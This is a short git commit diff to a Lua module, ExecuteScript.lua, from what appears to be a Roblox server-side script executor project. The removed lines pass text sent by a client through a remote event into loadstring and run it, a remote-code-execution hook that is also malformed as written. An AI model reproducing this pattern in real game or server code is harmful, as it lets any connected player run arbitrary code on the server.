7d5a99c64a301e7807b4c4a75ad0c982070623eb
Nikolai Evans <75125482+Nikev2@users.noreply.github.com>
2021-02-17 17:40:18 -0800

    Update ExecuteScript.lua

--- Modules/ExecuteScript.lua
+++ Modules/ExecuteScript.lua
@@ -2,8 +2,7 @@ remote.OnServerEvent:Connect(function(player, getstuff)
 	local paths = {
 		user = 'nikev2/',
 		main = 'SSUI/',
-		Modules = 'Modules/',}
-		
-		local raw = 'https://raw.githubusercontent.com/'
-		loadstring()(getstuff)()
+		Modules = 'Modules/',
+		raw = 'https://raw.githubusercontent.com/',}
+		                                           
 end)
